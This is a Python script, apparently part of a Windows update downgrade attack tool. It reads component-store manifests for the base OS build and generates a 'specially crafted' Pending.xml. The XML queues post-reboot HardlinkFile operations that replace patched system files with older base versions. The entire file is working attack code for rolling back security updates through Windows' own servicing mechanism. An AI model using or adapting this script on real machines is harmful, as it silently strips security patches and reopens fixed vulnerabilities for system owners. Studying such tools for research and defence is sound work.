import os

from component_store import get_manifest_names_per_build, decompress_manifest, expand_package_variables, \
    COMPONENT_STORE_PATH
from filesystem_utils import path_exists, is_file_contents_equal
from system_utils import get_base_os_build_number
from xml_utils import load_xml_from_buffer, load_xml, find_child_elements_by_match, get_element_attribute, \
    create_element, append_child_element, XmlElementNotFound, XmlElementAttributeNotFound

"""
Potential issues:
Some file elements do not contain destinationPath, usually .NET stuff 
"""


def main():

    skipped_paths = set()

    print("[+] Loading base downgrade XML")
    downgrade_root = load_xml("resources\\Pending.xml")
    poq_elements = find_child_elements_by_match(downgrade_root, "./POQ")
    poq_post_reboot_element = poq_elements[0]

    print("[+] Getting manifests for base version")
    base_os_build_number = get_base_os_build_number()
    base_manifests_names = get_manifest_names_per_build(base_os_build_number)

    print("[+] Parsing base version components")
    for base_manifest_name in base_manifests_names:

        base_manifest = decompress_manifest(base_manifest_name)

        base_manifest_root = load_xml_from_buffer(base_manifest.get_buffer())

        try:

            file_elements = find_child_elements_by_match(base_manifest_root, "{urn:schemas-microsoft-com:asm.v3}file")

            for file_element in file_elements:

                update_dir_path = get_element_attribute(file_element, "destinationPath")
                update_dir_path_exp = expand_package_variables(update_dir_path)
                update_file_name = get_element_attribute(file_element, "name")
                update_file_path = os.path.normpath(fr"\??\{update_dir_path_exp}\{update_file_name}")

                component_name, _ = os.path.splitext(base_manifest_name)
                base_file_path = os.path.normpath(fr"\??\{COMPONENT_STORE_PATH}{component_name}\{update_file_name}")
                base_file_path_exp = os.path.expandvars(base_file_path)
                if not path_exists(base_file_path_exp):
                    skipped_paths.add(base_file_path_exp)
                    continue

                # If update file exists, compare it with base version
                if path_exists(update_file_path):
                    if is_file_contents_equal(update_file_path, base_file_path_exp):
                        continue

                # If update file does not exist, and its directory tree also does not exist, create it
                else:
                    # File name sometimes contain directories, so we need to re-split the full update file path
                    update_full_dir_path, _ = os.path.splitext(update_file_path)
                    try:
                        os.makedirs(update_full_dir_path, exist_ok=True)
                    except PermissionError:
                        skipped_paths.add(update_file_path)
                        continue

                hardlink_element_attrs = {"source": base_file_path_exp, "destination": update_file_path}
                hardlink_element = create_element("HardlinkFile", hardlink_element_attrs)

                append_child_element(poq_post_reboot_element, hardlink_element)

        except (XmlElementAttributeNotFound, XmlElementNotFound):
            continue

    print("[+] Writing specially crafted downgrade XML")
    downgrade_root.write("Downgrade.xml")

    print(f"[!] Skipped paths: {skipped_paths}")


if __name__ == '__main__':
    main()
